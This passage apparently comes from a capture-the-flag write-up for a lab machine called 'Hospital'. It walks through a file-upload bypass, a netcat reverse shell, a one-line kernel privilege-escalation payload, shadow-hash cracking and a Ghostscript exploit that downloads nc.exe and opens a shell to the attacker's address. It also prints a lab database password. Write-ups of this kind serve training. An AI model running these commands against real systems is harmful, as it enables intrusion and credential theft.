+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-8_hu082ae2f37fc5ba4853b066807d6235c3_41086_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-8_hu082ae2f37fc5ba4853b066807d6235c3_41086_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Port 443"
+class="gallery-image"
+data-flex-grow="300"
+data-flex-basis="721px"
+>&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-1.png"
+width="1901"
+height="699"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-1_hu5847c4d6becd6f491397024ced5809b2_659115_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-1_hu5847c4d6becd6f491397024ced5809b2_659115_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="271"
+data-flex-basis="652px"
+>&lt;/p>
+&lt;p>Once connected, we can upload files, which seems promising as it&amp;rsquo;s the only functionality available after login. This appears to be the only path forward.&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-3.png"
+width="1896"
+height="754"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-3_hu88e9b2af2ddeb7131c0a3d5d937d8448_775776_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-3_hu88e9b2af2ddeb7131c0a3d5d937d8448_775776_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="251"
+data-flex-basis="603px"
+>&lt;/p>
+&lt;p>When uploading a PNG, GIF, or JPEG file, we&amp;rsquo;re redirected to &lt;strong>success.php.&lt;/strong>; otherwise, to .&lt;strong>failed.php.&lt;/strong>&lt;br>
+After some research, we can bypass this with what&amp;rsquo;s known as a &lt;em>&amp;ldquo;polyglot file&amp;rdquo;.&lt;/em>&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-4.png"
+width="1460"
+height="709"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-4_hub988252a687ca998cda4defd31c0050e_96581_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-4_hub988252a687ca998cda4defd31c0050e_96581_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="205"
+data-flex-basis="494px"
+>&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-5.png"
+width="1598"
+height="750"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-5_hu7e8826c03464de5cf6ddc77e86b3fd89_107018_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-5_hu7e8826c03464de5cf6ddc77e86b3fd89_107018_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="213"
+data-flex-basis="511px"
+> aussi pour extension phps / pgif&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-7.png"
+width="1194"
+height="458"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-7_hude54d970e1a8d2400ec21d9173a49385_68107_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-7_hude54d970e1a8d2400ec21d9173a49385_68107_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="260"
+data-flex-basis="625px"
+>&lt;/p>
+&lt;p>These article help me a lot : &lt;br>
+&lt;a class="link" href="https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology" target="_blank" rel="noopener"
+>https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology&lt;/a>&lt;/p>
+&lt;p>&lt;a class="link" href="https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a" target="_blank" rel="noopener"
+>https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a&lt;/a>&lt;/p>
+&lt;p>After injecting a PHP reverse shell, it was impossible to establish an incoming connection from the machine.
+Due to I/O error system&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-9.png"
+width="1880"
+height="343"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-9_hu8df1c61004781422a1c252e19c900ba1_203501_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-9_hu8df1c61004781422a1c252e19c900ba1_203501_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="548"
+data-flex-basis="1315px"
+>&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-6.png"
+width="1755"
+height="384"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-6_huf03952c3233f10791dbc10a3433cb2c9_68294_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-6_huf03952c3233f10791dbc10a3433cb2c9_68294_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="457"
+data-flex-basis="1096px"
+>&lt;/p>
+&lt;p>&lt;a class="link" href="https://medium.com/@tushar_rs_/remote-command-execution-through-file-upload-rce-3e72cb178bb8" target="_blank" rel="noopener"
+>https://medium.com/@tushar_rs_/remote-command-execution-through-file-upload-rce-3e72cb178bb8&lt;/a> &amp;ndash;&amp;gt; &lt;a class="link" href="https://github.com/flozz/p0wny-shell" target="_blank" rel="noopener"
+>https://github.com/flozz/p0wny-shell&lt;/a>&lt;/p>
+&lt;p>&lt;a class="link" href="https://medium.com/@tushar_rs_/remote-command-execution-through-file-upload-rce-3e72cb178bb8" target="_blank" rel="noopener"
+>https://medium.com/@tushar_rs_/remote-command-execution-through-file-upload-rce-3e72cb178bb8&lt;/a>&lt;/p>
+&lt;p>However, an IO problem becomes evident from the screenshot, rendering the attainment of a reverse shell unattainable. Consequently, we opt to employ P0nyshell to address this issue effectively.&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-10.png"
+width="1315"
+height="612"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-10_hu4ac3766ea9f61b94e7d62dd9c7342f80_76858_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-10_hu4ac3766ea9f61b94e7d62dd9c7342f80_76858_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="214"
+data-flex-basis="515px"
+>&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-11.png"
+width="1885"
+height="769"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-11_hud7038aec72d894c742fb790ddb214c57_51009_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-11_hud7038aec72d894c742fb790ddb214c57_51009_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="245"
+data-flex-basis="588px"
+>&lt;/p>
+&lt;h2 id="first-foothold">First FootHold&lt;/h2>
+&lt;p>Ww executed this command and get reverse shell !&lt;/p>
+&lt;p>&lt;code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.22 1234 &amp;gt;/tmp/f&lt;/code>&lt;/p>
+&lt;p>After establishing connectivity, my initial reflex is to examine any configuration files associated with the service on port 443 discovered earlier. However, upon reflection, this approach seems misguided, as the machine is identified as Windows based on the Nmap scan results. Consequently, we abandon this line of inquiry.&lt;/p>
+&lt;p>&lt;code>www-data@webserver:/var/www/html$ find / -name webmail 2&amp;gt;/dev/null www-data@webserver:/var/www/html$ find / -name roundcube 2&amp;gt;/dev/null&lt;/code> &amp;ndash;&amp;gt; nothing&lt;/p>
+&lt;p>Though credentials for MySQL are discovered early on, attempts to connect to it prove futile, hinting at the possibility of a potential rabbit hole.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">www&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="n">webserver&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">html&lt;/span>&lt;span class="o">$&lt;/span> &lt;span class="n">cat&lt;/span> &lt;span class="n">config&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="n">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">/*&lt;/span> &lt;span class="n">Database&lt;/span> &lt;span class="n">credentials&lt;/span>&lt;span class="o">.&lt;/span> &lt;span class="n">Assuming&lt;/span> &lt;span class="n">you&lt;/span> &lt;span class="n">are&lt;/span> &lt;span class="n">running&lt;/span> &lt;span class="n">MySQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">server&lt;/span> &lt;span class="n">with&lt;/span> &lt;span class="n">default&lt;/span> &lt;span class="n">setting&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">user&lt;/span> &lt;span class="s1">&amp;#39;root&amp;#39;&lt;/span> &lt;span class="n">with&lt;/span> &lt;span class="n">no&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*/&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">define&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;DB_SERVER&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;localhost&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">define&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;DB_USERNAME&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;root&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">define&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;DB_PASSWORD&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;my$qls3rv1c3!&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">define&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;DB_NAME&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;hospital&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">/*&lt;/span> &lt;span class="n">Attempt&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="n">connect&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="n">MySQL&lt;/span> &lt;span class="n">database&lt;/span> &lt;span class="o">*/&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">$&lt;/span>&lt;span class="n">link&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">mysqli_connect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">DB_SERVER&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">DB_USERNAME&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">DB_PASSWORD&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">DB_NAME&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">//&lt;/span> &lt;span class="n">Check&lt;/span> &lt;span class="n">connection&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">$&lt;/span>&lt;span class="n">link&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="bp">false&lt;/span>&lt;span class="p">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">die&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;ERROR: Could not connect. &amp;#34;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="n">mysqli_connect_error&lt;/span>&lt;span class="p">());&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="first-privilege-escalation">First Privilege Escalation&lt;/h2>
+&lt;p>After several unsuccessful attempts, I revisit my notes and initiate a privilege escalation at the source. This involves inspecting the SUID binaries, followed by a naïve execution of sudo -l, and subsequently checking the kernel version. This effort eventually leads to the identification of our next exit route: &lt;code>CVE-2023-032629.&lt;/code>&lt;/p>
+&lt;p>We execute this payload to get root privilege because kernel version was old &lt;code>(5.19.0)&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">unshare -rm sh -c &lt;span class="s2">&amp;#34;mkdir l u w m &amp;amp;&amp;amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;amp;&amp;amp; touch m/*;&amp;#34;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> u/python3 -c &lt;span class="s1">&amp;#39;import os;os.setuid(0);os.system(&amp;#34;cp /bin/bash /var/tmp/bash &amp;amp;&amp;amp; chmod 4755 /var/tmp/bash &amp;amp;&amp;amp; /var/tmp/bash -p &amp;amp;&amp;amp; rm -rf l m u w /var/tmp/bash&amp;#34;)&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Subsequently, while exploring the files as root (and not NT\Authority), three interesting usernames are encountered: google, josharian, mdlayher, vishvananda from /home/drwilliams/go/pkg/mod/github.com. &lt;br>
+Unfortunately, nothing of significance is discovered, save for a Go project.&lt;/p>
+&lt;p>Capitalizing on my newfound root status, I seize the opportunity to retrieve Dr. Williams&amp;rsquo; hash and proceed to crack it using our trusty ally John.&lt;/p>
+&lt;p>&lt;code>$6$uWBSe***blablablasomerandomstuffs***W192y/:19612:0:99999:7:::&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-12.png"
+width="1474"
+height="754"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-12_hua05d3abc3ef8a01d36132a43c4da66dc_210164_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-12_hua05d3abc3ef8a01d36132a43c4da66dc_210164_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="195"
+data-flex-basis="469px"
+>&lt;/p>
+&lt;p>and our best friend John gave us the password !&lt;/p>
+&lt;h2 id="2supndsup-foothold">2&lt;sup>nd&lt;/sup> FootHold&lt;/h2>
+&lt;p>With the password successfully obtained, we can finally return to the website on port 443. Upon logging in, we stumble upon an intriguing email tasking us with designing something in .eps format for viewing by GhostScript.&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-13.png"
+width="1905"
+height="837"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-13_hu3571bdd648b3fb24eb93fd789aa0565b_93756_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-13_hu3571bdd648b3fb24eb93fd789aa0565b_93756_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="227"
+data-flex-basis="546px"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Dear Lucy,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">I wanted to remind you that the project for lighter, cheaper and
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">environmentally friendly needles is still ongoing 💉. You are the one in
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">charge of providing me with the designs for these so that I can take
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">them to the 3D printing department and start producing them right away.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Please make the design in an &amp;#34;.eps&amp;#34; file format so that it can be well
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">visualized with GhostScript.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Best regards,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Chris Brown.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;em>Notice that .eps &amp;ndash;&amp;gt; adobe format stand for encapsulated postscript&lt;/em>&lt;/p>
+&lt;p>After reading the email, it is clear that we need to send him a .eps file. Fortunately, the first GitHub link we found provides a Proof of Concept (PoC) on an exploit that allows us to achieve Remote Code Execution (RCE) that&amp;rsquo;s the &lt;strong>CVE-2023–36664&lt;/strong>. &lt;br>
+To accomplish this, we ensure that the target machine has Netcat installed, so we send it first, and then proceed to use the sent file (Netcat) to execute commands.&lt;/p>
+&lt;p>Some ref : &lt;br>
+&lt;a class="link" href="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection.git" target="_blank" rel="noopener"
+>https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection.git&lt;/a>&lt;/p>
+&lt;p>&lt;a class="link" href="https://www.youtube.com/watch?v=Gh-A49rqrJI&amp;amp;ab_channel=%C3%81kosJakab" target="_blank" rel="noopener"
+>https://www.youtube.com/watch?v=Gh-A49rqrJI&amp;ab_channel=%C3%81kosJakab&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">python3 CVE_2023_36664_exploit.py --inject --payload &lt;span class="s2">&amp;#34;curl http://10.10.14.7/nc.exe -o nc.exe&amp;#34;&lt;/span> --filename file.eps
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>and,&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">python3 CVE_2023_36664_exploit.py --inject --payload &lt;span class="s2">&amp;#34;nc.exe 10.10.14.7 1234 -e cmd&amp;#34;&lt;/span> --filename rv.eps
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Once this is done, we reply to this email, clicking on the paperclip icon (attachment), selecting the file, and then sending it in return.&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/image-4.png"
+width="800"
+height="228"
+srcset="https://shaanksm.github.io/p/hospital-writeup/image-4_hu4af202d0cb5bf57c78fb8d4a60b9abba_25387_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/image-4_hu4af202d0cb5bf57c78fb8d4a60b9abba_25387_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Send our netcat.exe"
+class="gallery-image"
+data-flex-grow="350"
+data-flex-basis="842px"
+>&lt;/p>
+&lt;p>We patiently wait for her to open the email,&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/image-2.png"
+width="1885"
+height="766"
+srcset="https://shaanksm.github.io/p/hospital-writeup/image-2_huba2e9a8d03b4d542c8e3a486a3922f1e_144902_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/image-2_huba2e9a8d03b4d542c8e3a486a3922f1e_144902_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Process to reply and send our payloads"
+class="gallery-image"
+data-flex-grow="246"
+data-flex-basis="590px"
+>&lt;/p>
+&lt;p>and we obtain a reverse shell.&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/image-5.png"
+width="933"
+height="310"
+srcset="https://shaanksm.github.io/p/hospital-writeup/image-5_hu87df8fbb037675dc502b3fe2f6af19eb_65969_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/image-5_hu87df8fbb037675dc502b3fe2f6af19eb_65969_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Got revershell as DrBrown"
+class="gallery-image"
+data-flex-grow="300"
+data-flex-basis="722px"
+>&lt;/p>
+&lt;h2 id="2supndsup-privilege-esclation">2&lt;sup>nd&lt;/sup> Privilege Esclation&lt;/h2>
+&lt;p>Upon connection, we notice a batch file containing Dr. Brown&amp;rsquo;s credentials. Although not yet attempted, I assume we can connect using Evil-WinRM and obtain a more stable shell.&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/image-7.png"
+width="1897"
+height="171"
+srcset="https://shaanksm.github.io/p/hospital-writeup/image-7_hu69f05eb2eb65f22a87725199e910a938_66797_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/image-7_hu69f05eb2eb65f22a87725199e910a938_66797_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Retrieve DrBrown&amp;rsquo;s password from bat&amp;rsquo;s script"
+class="gallery-image"
+data-flex-grow="1109"
+data-flex-basis="2662px"
+>&lt;/p>
+&lt;p>back to nmap ;&lt;br>
+We utilize these credentials to enumerate what we can. With nothing significant found in SMB, we pivot towards rpcclient. &lt;br>
+After several commands yield no fruitful results&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">rpcclient 10.10.11.241 -U &lt;span class="s2">&amp;#34;drbrown&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>&lt;code>tshareenum&lt;/code> &amp;ndash;&amp;gt; acces denied \&lt;/li>
+&lt;li>&lt;code>enum&lt;/code> &amp;ndash;&amp;gt; command not found&lt;/li>
+&lt;li>&lt;code>enumdomains&lt;/code> &amp;ndash;&amp;gt; none intersting&lt;/li>
+&lt;li>&lt;code>enumdomgroups&lt;/code> &amp;ndash;&amp;gt; retrieve rid of admin&lt;/li>
+&lt;li>&lt;code>querygroup&lt;/code> &lt;RID ADMIN> &amp;ndash;&amp;gt; some information&lt;/li>
+&lt;/ul>
+&lt;p>Next, I discovered the necessary command from this remarkable website.
+&lt;a class="link" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration?source=post_page-----791ad6dd24ed--------------------------------" target="_blank" rel="noopener"
+>https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration?source=post_page-----791ad6dd24ed--------------------------------&lt;/a>&lt;/p>
+&lt;p>, we then utilize the &lt;code>querydispinfo&lt;/code> command and notice that Administrator Information is shared with the Guest..&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/image-9.png"
+width="1568"
+height="437"
+srcset="https://shaanksm.github.io/p/hospital-writeup/image-9_hu9c2da5f945ca3c3279dfa355137c2106_239412_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/image-9_hu9c2da5f945ca3c3279dfa355137c2106_239412_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="358"
+data-flex-basis="861px"
+>&lt;/p>
+&lt;p>Knowing that this machine hosts a web application, we exploit the C drive and gain access to the directory of the web application. &lt;br>
+Upon using &lt;code>icacls&lt;/code>, it reveals the permissions of the accounts on this folder.&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/image-11.png"
+width="619"
+height="385"
+srcset="https://shaanksm.github.io/p/hospital-writeup/image-11_hud77c0b1bdec1ca3049fbbc0ed8153c42_73459_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/image-11_hud77c0b1bdec1ca3049fbbc0ed8153c42_73459_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="160"
+data-flex-basis="385px"
+>&lt;/p>
+&lt;p>We know that this machine is running a web application so we exploit C drive and we have the directory of web application. Upon using icacls, it tells us the permission of the accounts on this folder.&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/image-13.png"
+width="619"
+height="593"
+srcset="https://shaanksm.github.io/p/hospital-writeup/image-13_hu8fa3ae32af05bc9d3b00ec3cf6a208bf_135284_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/image-13_hu8fa3ae32af05bc9d3b00ec3cf6a208bf_135284_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="104"
+data-flex-basis="250px"
+>&lt;/p>
+&lt;p>To locate my reverse shell I used this forum : &lt;a class="link" href="https://stackoverflow.com/questions/16772198/how-do-i-test-a-website-using-xampp" target="_blank" rel="noopener"
+>https://stackoverflow.com/questions/16772198/how-do-i-test-a-website-using-xampp&lt;/a>&lt;/p>
